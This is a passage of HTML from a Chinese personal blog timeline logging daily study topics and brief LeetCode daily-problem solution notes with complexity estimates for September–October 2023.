type="math/tex">O(max(logn,logm))</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-26"><a href="#2023-10-26" class="headerlink" title="2023-10-26"></a>2023-10-26</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-26"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-26-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-26-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-26-1"><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-26-2"><p><a href="https://leetcode.cn/problems/count-the-digits-that-divide-a-number/">2520. 统计能整除数字的位数</a></p><p>C++：提出每一位做运算。提出位数的方法：<code>int temp = num % 10; num = num / 10;</code></p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-25"><a href="#2023-10-25" class="headerlink" title="2023-10-25"></a>2023-10-25</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-25"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-25-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-25-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-25-1"><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-25-2"><p><a href="https://leetcode.cn/problems/find-the-punishment-number-of-an-integer/">2698. 求一个整数的惩罚数</a></p><p>C++思路：打表。表的数据按递归获得。</p><p>时间：<script type="math/tex">O(m)</script>，m是表长。</p><p>空间：<script type="math/tex">O(m)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-24"><a href="#2023-10-24" class="headerlink" title="2023-10-24"></a>2023-10-24</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-24"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-24-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-24-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-24-1"><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-24-2"><p><a href="https://leetcode.cn/problems/number-of-dice-rolls-with-target-sum/">1155. 掷骰子等于目标和的方法数</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-23"><a href="#2023-10-23" class="headerlink" title="2023-10-23"></a>2023-10-23</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-23"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-23-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-23-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-23-1"><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-23-2"><p><a href="https://leetcode.cn/problems/number-of-senior-citizens/">2678. 老人的数目</a></p><p>C++思路：模拟，枚举对应字符进行判断。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-22"><a href="#2023-10-22" class="headerlink" title="2023-10-22"></a>2023-10-22</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-22"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-22-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-22-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-22-1"><p>算法题练习。</p><p>Django学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-22-2"><p><a href="https://leetcode.cn/problems/reducing-dishes/">1402. 做菜顺序</a></p><p>C++思路：贪心算法。排序，然后找到0的位置。然后记录两个数，一个是从0开始后面的累加和，一个是从0开始后面的累加和，但是包含等级。此时res等于带等级的累加和。然后做一个for循环，从0的前一个数开始向前加。同样是记录两个数，一个是从此开始向前的累加和，一个是带等级的，等级从1开始。每次判断，当正累计和加上负累计和小于res，返回上一个res即可。</p><p>时间：<script type="math/tex">O(nlogn)</script></p><p>空间：<script type="math/tex">O(logn)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-21"><a href="#2023-10-21" class="headerlink" title="2023-10-21"></a>2023-10-21</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-21"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-21-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-21-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-21-1"><p>算法题练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-21-2"><p><a href="https://leetcode.cn/problems/count-unreachable-pairs-of-nodes-in-an-undirected-graph/">2316. 统计无向图中无法互相到达点对数</a></p><p>C++思路：并查集。官解。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-20"><a href="#2023-10-20" class="headerlink" title="2023-10-20"></a>2023-10-20</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-20"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-20-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-20-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-20-1"><p>算法题练习。</p><p>cocos学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-20-2"><p><a href="https://leetcode.cn/problems/categorize-box-according-to-criteria/">2525. 根据规则将箱子分类</a></p><p>C++思路：模拟。注意溢出。</p><p>时间：<script type="math/tex">O(1)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-19"><a href="#2023-10-19" class="headerlink" title="2023-10-19"></a>2023-10-19</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-19"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-19-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-19-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-10-19-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-19-1"><p>算法题练习。</p><p>C++游戏练习。</p><p>python工具编写。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-19-2"><p><a href="https://leetcode.cn/problems/tuple-with-same-product/">1726. 同积元组</a></p><p>C++：哈希表。由题nums由不同正整数组成，所以数字两两的乘积若相等，则数一定不相等，满足题意。所以只需把两两乘积加入到字典中，乘积值为键，乘积的个数为值。最后再写一个for，提出哈希表的累加到结果中，根据排列组合，<code>res += val * (val - 1) * 4;</code>最后返回res。</p><p>时间：<script type="math/tex">O(n^2)</script></p><p>空间：<script type="math/tex">O(n^2)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-19-3"><p>计算机网络：整理。</p><p>C++：整理。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-18"><a href="#2023-10-18" class="headerlink" title="2023-10-18"></a>2023-10-18</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-18"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-18-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-18-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-18-1"><p>算法题练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-18-2"><p><a href="https://leetcode.cn/problems/maximal-score-after-applying-k-operations/">2530. 执行 K 次操作后的最大分数</a></p><p>C++：优先队列+贪心。构建优先队列，然后一个for循环，每次找出优先队列的最大的数，累加后按题意操作，再放回到优先队列中。返回累加值</p><p>时间：<script type="math/tex">O(klogn+n)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-17"><a href="#2023-10-17" class="headerlink" title="2023-10-17"></a>2023-10-17</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-17"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-17-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-17-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-10-17-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-17-1"><p>算法题练习。</p><p>C++游戏练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-17-2"><p><a href="https://leetcode.cn/problems/sum-multiples/">2652. 倍数求和</a></p><p>C++思路：数学。求出n之前的3，5，7分别的倍数之和，然后减去两两搭配的值，最后加上<code>3 * 5 * 7</code>的和的值，就是最后的值。求和可以用等差数列来求。（可以画韦恩图理解思路）</p><p>时间：<script type="math/tex">O(1)</script></p><p>控件：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-17-3"><p>新增C++游戏。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-16"><a href="#2023-10-16" class="headerlink" title="2023-10-16"></a>2023-10-16</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-16"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-16-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-16-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-16-1"><p>算法题练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-16-2"><p><a href="https://leetcode.cn/problems/single-number-iii/">260. 只出现一次的数字 III</a></p><p>C++思路：位运算。先全异或，得到的结果是两个只出现一次的元素的异或结果。然后从右向左找到第一个1，表明这是两个数首个不同的地方，记为div。然后再做一个for循环，让结果和div做与运算。为0的分成一组，结果与nums[i]异或。不为0的分为另一组，结果与nums[i]异或。这样两个数就被区分开来，剩下的数也被异或成了0。返回这两个数。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-15"><a href="#2023-10-15" class="headerlink" title="2023-10-15"></a>2023-10-15</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-15"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-15-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-15-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-15-1"><p>算法题练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-15-2"><p><a href="https://leetcode.cn/problems/single-number-ii/">137. 只出现一次的数字 II</a></p><p>C++思路：位运算模3。一个for循环，循环32次。在循环中对nums做一个for循环，每次拿出nums的同一位数累加，然后将结果取模3后移回原始位数。返回结果。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-14"><a href="#2023-10-14" class="headerlink" title="2023-10-14"></a>2023-10-14</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-14"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-14-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-14-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-14-1"><p>算法题练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-14-2"><p><a href="https://leetcode.cn/problems/single-number/">136. 只出现一次的数字</a></p><p>C++思路：异或。设置一个res为0。然后让每一个nums值和res做异或，因为两个相同的数异或为0，所以那个只出现一次的数和res异或后就是那个数。返回res。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-13"><a href="#2023-10-13" class="headerlink" title="2023-10-13"></a>2023-10-13</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-13"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-13-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-13-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-13-1"><p>算法题练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-13-2"><p><a href="https://leetcode.cn/problems/avoid-flood-in-the-city/">1488. 避免洪水泛滥</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-12"><a href="#2023-10-12" class="headerlink" title="2023-10-12"></a>2023-10-12</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-12"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-12-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-12-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-10-12-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-12-1"><p>复习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-12-2"><p><a href="https://leetcode.cn/problems/find-the-array-concatenation-value/">2562. 找出数组的串联值</a></p><p>python3思路：转成字符串挨个拼接后转成整形求和。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-12-3"><p>C++：C语言。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-11"><a href="#2023-10-11" class="headerlink" title="2023-10-11"></a>2023-10-11</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-11"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-11-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-11-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-11-1"><p>复习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-11-2"><p><a href="https://leetcode.cn/problems/reward-top-k-students/">2512. 奖励最顶尖的 K 名学生</a></p><p>python3思路：哈希。先把积极词和消极词都存入字典中，然后将评语和id绑定，依次判断每个人的总分，然后选出总分最高的几位即可。</p><p>时间：<script type="math/tex">O(nlogn)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-10"><a href="#2023-10-10" class="headerlink" title="2023-10-10"></a>2023-10-10</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-10-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-10-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-10-1"><p>计算机网络复习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-10-2"><p><a href="https://leetcode.cn/problems/movement-of-robots/">2731. 移动机器人</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-09"><a href="#2023-10-09" class="headerlink" title="2023-10-09"></a>2023-10-09</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-09"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-09-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-09-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-09-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-09-2"><p><a href="https://leetcode.cn/problems/split-with-minimum-sum/">2578. 最小和分割</a></p><p>python3思路：字典+贪心。先把数字出现的次数放入字典中。然后确定num1和num2的位数。比如num是6位那么num1和num2都是3位。然后while循环，从字典的小键加到大键。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-08"><a href="#2023-10-08" class="headerlink" title="2023-10-08"></a>2023-10-08</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-08"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-08-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-08-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-08-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-08-2"><p><a href="https://leetcode.cn/problems/stock-price-fluctuation/">2034. 股票价格波动</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-07"><a href="#2023-10-07" class="headerlink" title="2023-10-07"></a>2023-10-07</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-07"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-07-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-07-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-07-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-07-2"><p><a href="https://leetcode.cn/problems/online-stock-span/">901. 股票价格跨度</a></p><p>python3思路：单调栈。初始化函数中设定一个栈。在next函数中先设置res=1。然后一个while循环，当栈不空且栈顶值小于等于price时，栈顶出栈，res加上栈顶的第二个元素值。循环结束后将当前的price值和res值构成一个列表存入栈中，返回res。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-06"><a href="#2023-10-06" class="headerlink" title="2023-10-06"></a>2023-10-06</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-06"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-06-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-06-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-06-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-06-2"><p><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/">714. 买卖股票的最佳时机含手续费</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-05"><a href="#2023-10-05" class="headerlink" title="2023-10-05"></a>2023-10-05</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-05"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-05-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-05-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-10-05-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-05-1"><p>typescript学习。</p><p>cocos学习。</p><p>git学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-05-2"><p><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-cooldown/">309. 买卖股票的最佳时机含冷冻期</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-05-3"><p>linux：格式修改。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-04"><a href="#2023-10-04" class="headerlink" title="2023-10-04"></a>2023-10-04</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-04"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-04-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-04-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-04-1"><p>cocos学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-04-2"><p><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-iv/">188. 买卖股票的最佳时机 IV</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-03"><a href="#2023-10-03" class="headerlink" title="2023-10-03"></a>2023-10-03</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-03"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-03-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-03-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-03-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-03-2"><p><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-iii/">123. 买卖股票的最佳时机 III</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-02"><a href="#2023-10-02" class="headerlink" title="2023-10-02"></a>2023-10-02</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-02"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-02-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-02-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-02-1"><p>星火编辑器。</p><p>cocos学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-02-2"><p><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/">122. 买卖股票的最佳时机 II</a></p><p>python3思路：贪心算法，最低值买入最高值卖出即可。设置最低最高值都为第一个值。然后for循环，当价格小于最高值时，结果加上最高值减去最低值，更新最低最高值为当前值，否则更新最高值为当前值即可。最后返回<code>res + maxs - mins</code>。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-10-01"><a href="#2023-10-01" class="headerlink" title="2023-10-01"></a>2023-10-01</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-10-01"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-10-01-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-10-01-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-10-01-1"><p>cocos学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-10-01-2"><p><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a></p><p>python3：遍历。先找到第一个值作为最小值，然后for循环。当价格小于最小值，<code>mins = min(mins,prices[i])</code>。否则<code>res = max(res,prices[i] - mins)</code>。返回res。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div><div class="timeline  blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h2 id="2023-9"><a href="#2023-9" class="headerlink" title="2023-9"></a>2023-9</h2></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-30"><a href="#2023-9-30" class="headerlink" title="2023-9-30"></a>2023-9-30</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-30"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-30-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-30-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-30-1"><p>星火编辑器。</p><p>JavaScript学习。</p><p>cocos学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-30-2"><p><a href="https://leetcode.cn/problems/earliest-possible-day-of-full-bloom/">2136. 全部开花的最早一天</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-28"><a href="#2023-9-28" class="headerlink" title="2023-9-28"></a>2023-9-28</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-28"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-28-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-28-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-28-1"><p>星火编辑器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-28-2"><p><a href="https://leetcode.cn/problems/number-of-flowers-in-full-bloom/">2251. 